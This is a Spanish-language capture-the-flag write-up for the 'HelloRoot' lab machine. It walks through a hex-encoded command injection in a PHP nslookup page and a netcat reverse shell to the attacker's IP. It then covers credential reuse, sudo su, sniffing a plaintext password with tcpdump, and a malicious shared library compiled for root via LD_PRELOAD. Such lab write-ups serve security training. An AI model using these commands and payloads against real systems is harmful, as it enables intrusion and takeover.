
# Writeup Template: Maquina `[ HelloRoot ]`

- Tags: #HellRoot #Gitea #TCPDump #ldd
- Dificultad: `[ Media ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
Realizamos reconocimiento del objetivo
```bash
sudo arp-scan -I wlan0 --localnet --ignoredups

192.168.100.31  08:00:27:5c:89:6f  PCS Systemtechnik GmbH
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.31 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.31
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.31 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.31 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,222,443,5000 192.168.100.31 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.29.0
5000/tcp open  http     Apache httpd
```
---

Tenemos el primer servicio, Es un apache:
```bash
http://192.168.100.31/
```

Realizando fuzzing sobre este pero no tiene nada interesante:
```bash
gobuster dir -u http://192.168.100.31/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -t 50 -x php,php.back,backup,txt,html,js,java,py,zip
```
## Enumeracion de [Servicio Web Principal]
Si accedemos a la siguiente direccion en el puerto **443** vemos que se esta aplicando **hostDiscovery** por lo cual agregamos este **dominio** a nuestro archivo: **( /etc/hosts )**
```bash
192.168.100.31 git.hellroot.thl
```

Ahora si tenemos acceso al servicio web
```bash
https://git.hellroot.thl/
```
## Características principales de Gitea:
**Gitea** es un **servicio de forja (forge) de software** autohospedado de **código abierto** que permite alojar repositorios Git. Es similar a **GitHub** o **GitLab**, pero mucho más **ligero** y **fácil de instalar**.
### 🔧 Funcionalidades básicas:
- **Repositorios Git** públicos y privados
- **Issue tracking** (seguimiento de incidencias)
- **Pull requests** y revisiones de código
- **Wiki** para documentación
- **Sistema de usuarios** y organizaciones
- **Webhooks** e integraciones
#### 🚀 Caracteristicas:
- **Ligero**: Consume pocos recursos (ideal para Raspberry Pi, VPS pequeños)
- **Autohospedado**: Tus datos son tuyos, no en la nube de terceros
- **Open Source**: Licencia MIT, puedes modificarlo
- **Fácil instalación**: Solo un binario ejecutable
- **Go-based**: Escrito en Go, por tanto es rápido y eficiente
- **Puede contener credenciales** en repositorios
- **Suele tener vulnerabilidades** de ejecución de código
- **Es común en redes internas** empresariales
- **Puede ser vector de attack** si está mal configurado

**Instalacion:**
```bash
# Descargar binario
wget -O gitea https://dl.gitea.io/gitea/1.21.0/gitea-1.21.0-linux-amd64
chmod +x gitea

# Ejecutamos el binario
./gitea web
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb https://git.hellroot.thl/
https://git.hellroot.thl/ [200 OK] Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.29.0], HttpOnly[_csrf,i_like_gitea], IP[192.168.100.31], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN], nginx[1.29.0]
```
### Descubrimiento de Archivos y Rutas
Tenemos el panel principal al cual reazlizamos fuzzing de archvos y directorios
```bash
gobuster dir -u https://git.hellroot.thl/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -t 50 -x php,php.back,backup,txt,html,js,java,py,zip --no-tls-validation
```

- **Hallazgos**:
```bash
/issues               (Status: 303) [Size: 38] [--> /user/login]
/v2                   (Status: 401) [Size: 50]
/explore              (Status: 303) [Size: 41] [--> /explore/repos]
/astro                (Status: 200) [Size: 22001]
/milestones           (Status: 303) [Size: 38] [--> /user/login]
/notifications        (Status: 303) [Size: 38] [--> /user/login]
```

Tenemos el repositorio del usuario **astro**, 
```bash
https://git.hellroot.thl/Astro/hellroot.thl
```

Revisando el repo vemos la siguiente informacin de como estar construido, el servicion el el puerto **5000**
En el codigo php vemos como se esta enplenado **nslookup**
```bash
https://git.hellroot.thl/Astro/hellroot.thl/src/branch/main/index.php
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
El código es vulnerable a **inyección de comandos** debido a que **no sanitiza correctamente** la entrada antes de pasarla a `shell_exec()`.
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['domain'])) {
    $input = trim($_POST['domain']);
    $decoded = @hex2bin($input);

    // Always show raw output for debugging
    ob_start();

    if ($decoded !== false && ctype_print($decoded)) {
        if (strpos($decoded, ';') !== false) {
            // Remove header modification that breaks execution
            $output = shell_exec($decoded . ' 2>&1');
        } else {
            $safeDomain = escapeshellarg($decoded);
            $output = shell_exec("nslookup $safeDomain 2>&1");
        }
    } else {
        $safeDomain = escapeshellarg($input);
        $output = shell_exec("nslookup $safeDomain 2>&1");
    }

    echo '<pre class="result">' . htmlspecialchars($output ?: 'No output returned.') . '</pre>';
    ob_end_flush();
}
?>
```

Tambien tenemos potenciales credenciales del usuario astro en el sistema, Una ves que ganemos acceso intentaremos ver si son validas en el sistema
```bash
|`# Create user astro with passwordless sudo access only for /bin/su`|
|`RUN useradd -m astro && echo "astro:iloveastro" \| chpasswd && \`|
|`echo "astro ALL=(ALL:ALL) NOPASSWD: /bin/su" > /etc/sudoers.d/astro-su && \`|
`chmod 440 /etc/sudoers.d/astro-su`
```

Ahora si ingresamos al servicio en el puerto **5000**, Realizamos **ByPass Hex Decoding**
```bash
http://192.168.100.31:5000/
```
### Ejecucion del Ataque
**Nota** en el script de php tiene esta funcion que espare en hexadecimal el input
**`@hex2bin($input)`** es una función de PHP que **convierte una cadena hexadecimal de vuelta a su forma binaria original** (es decir, la decodifica). El símbolo `@` suprime los mensajes de error.
```bash
$input = "77686f616d69"; // "whoami" en hex
$decoded = hex2bin($input); // Convierte a "whoami"
```

Ahora sabiendo esto, Nos aprovechamos para desde nuestra terminal, Convertir el comando **whoami** en **hexadecimal** para ejecutar comandos
```bash
echo -n "whoami;" | xxd -p
77686f616d693b # Output
```

Ahora desde la web pegamos el **Output** de salida
```bash
# Comandos para explotación
77686f616d693b 

# Respuesta del servidor
www-data
```
### Intrusion
Ahora que tenemos ejecucion remota de comandos, Procedemos a ponernos en escucha para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
echo -n "nc -c sh 192.168.100.26 443;" | xxd -p

# Este output va en el input del servicio web
6e63202d63207368203139322e3136382e3130302e3236203434333b
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuairo del sistema
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
astro:x:1001:1001::/home/astro:/bin/sh
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Una ves confirmada el usuario valido **astro** procedemos a usar las credenciales que antes ya habiamos encontrado para loguearnos como ese usuario
```bash
su astro # iloveastro
```

###### Usuario Contendor `[ Astro ]`:
LIstamos los permisos de este usuario:
```bash
sudo -l

User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
```

Nos convertiomos en **root**
```bash
astro@05cc10128c04:~$ sudo -u root /bin/su root
```

Ahora realizando fuzzing en la siguente ruta:
```bash
gobuster dir -u http://192.168.100.31:5000/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

Tenemos una nueva ruta:
```bash
/sniff.txt            (Status: 200) [Size: 72]
```

Si revisamos esta ruta vemos lo siguiente:
```bash
http://192.168.100.31:5000/sniff.txt

# contenido:
Puede que haya ciertas herramientas que te permitan esnifar el trafico.
```

Tendriamos que usar herraminetas como **tshark** o **tcpdump** para **sniffear** el trafico de red en la maquina victima:
Como la maquina victima tiene installado **tcpdump** tendremos que hacerlo con esta herramienta, Asi que iniciamos la herramienta para ponernos en modo escucha
Si revisamos la interfaz de red vemos que es un contenedor **docker**
```bash
root@05cc10128c04:/home/astro# hostname -I
172.17.0.2
```

Ahora para atrapar todo el trafico del contenedor realizamos el siguiente comando
```bash
sudo tcpdump -i eth0 -A -s0 -w gitea_capture.pcap host 172.17.0.2 and \(port 80 or port 3000 or port 443\)
```

Y para leer la captura ejecutamos el siguiente comando:
```bash
tcpdump -r gitea_capture.pcap -n -A
```

En la captura vemos lo siguiente
```bash
Host: 172.17.0.2
User-Agent: curl/7.88.1
Accept: */*
Content-Length: 74
Content-Type: application/x-www-form-urlencoded

username=astro&password=wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS
```

Tenemos una potencial password que usaremos para conectarnos por **ssh** el host objetivo, Logramos salir del contenedor
```bash
ssh astro@192.168.100.31 # wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS
```
###### Usuario `[ Astro ]`:
```bash
ls -la
#Flag de usuario
-rw-r--r-- 1 root  root    33 jul 18 21:49 user.txt
```

Ahora buscando binario **SUID**, Tenemos lo sigueinte:
```bash
find / -perm -4000 -ls 2>/dev/null
   262736     16 -rwsr-xr-x   1 root     root        16296 jul 19 02:00 /usr/local/bin/secmonitor
```

Para esta parte se realiza una investigacion para determianr que es y como es que funciona
Usamos **`ldd`** que es una herramienta que **lista las dependencias dinámicas** de un binario o librería. Te muestra qué librerías compartidas necesita un programa para ejecutarse
**dependencias dinámicas**  Son las librerías externas (.so en Linux, .dll en Windows) que un programa necesita para funcionar, pero que no están incluidas dentro del propio ejecutable.
##### 🔍 Información que proporciona:
- **Librerías requeridas** por el ejecutable
- **Ruta donde se encuentran** actualmente
- **Direcciones de memoria** donde se cargan

Ejecutando el comando **ldd** nos da la sigueinte salida
```bash
ldd /usr/local/bin/secmonitor
        linux-vdso.so.1 (0x00007ffca8bbf000)
        libmonitor.so => /usr/local/lib/libmonitor.so (0x00007fa084298000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa0840b7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa0842ab000)
```

#### Investigando todo el output tenemos la siguiente informacion:
##### **1. `linux-vdso.so.1 (0x00007ffca8bbf000)`**
- **VDSO** (Virtual Dynamic Shared Object)
- **Librería especial del kernel** para acelerar syscalls
- **No es un archivo físico** en disco, está mapeada en memoria por el kernel
- **Normal y esperado** en todos los binarios Linux
##### **2. `libmonitor.so => /usr/local/lib/libmonitor.so (0x00007fa084298000)`**
- **Librería personalizada** llamada `libmonitor.so`
- **Se encuentra en:** `/usr/local/lib/libmonitor.so`
- **Probablemente creada específicamente** para `secmonitor`
- **Dirección de memoria:** `0x00007fa084298000`
##### **3. `libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa0840b7000)`**
- **Librería C estándar** (glibc)
- **Básica para casi todos** los programas en Linux
- **Path normal:** `/lib/x86_64-linux-gnu/libc.so.6`
- **Dirección de memoria:** `0x00007fa0840b7000`
##### **4. `/lib64/ld-linux-x86-64.so.2 (0x00007fa0842ab000)`**
- **Dynamic linker/loader**
- **Responsable de cargar** las librerías dinámicas
- **Essential para la ejecución** de binarios dinámicos
- **Dirección de memoria:** `0x00007fa0842ab000`
##### **Es un binario dinámico** que depende de:
1. **`libmonitor.so`** - Librería personalizada (probablemente de monitoreo de seguridad)
2. **`libc.so.6`** - Librería C estándar
3. **`ld-linux-x86-64.so.2`** - Cargador dinámico
##### **Características importantes:**
- **✅ No tiene dependencias missing** - Todas las librerías se encontraron
- **✅ Usa librerías estándar** + una personalizada
- **✅ Paths normales** - No hay librerías en lugares sospechosos

Sabiendo esto podemos crear un binario malicioso que sustituya a **libmonitor.so** que al ejecutarse de permisos **SUID** a la bash de root
```so
# Crear el archivo con el código malicioso
cat > /tmp/malicious_lib.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
```

Ahora lo compilamos
```bash
gcc -shared -fPIC -w -o /tmp/libmonitor.so /tmp/malicious_lib.c
```

Ahora ejecutamos
```bash
# Comando para escalar al usuario: ( root )
LD_PRELOAD=/tmp/libmonitor.so /usr/local/bin/secmonitor
```

---

## Evidencia de Compromiso
Flag de root
```bash
# ls -la /root

-rw-r--r--  1 root root   33 jul 19 02:30 root.txt
```

```bash
# Captura de pantalla o output final
# echo -n "\n[+] Hacked: $(whoami)\n\n"

[+] Hacked: root
```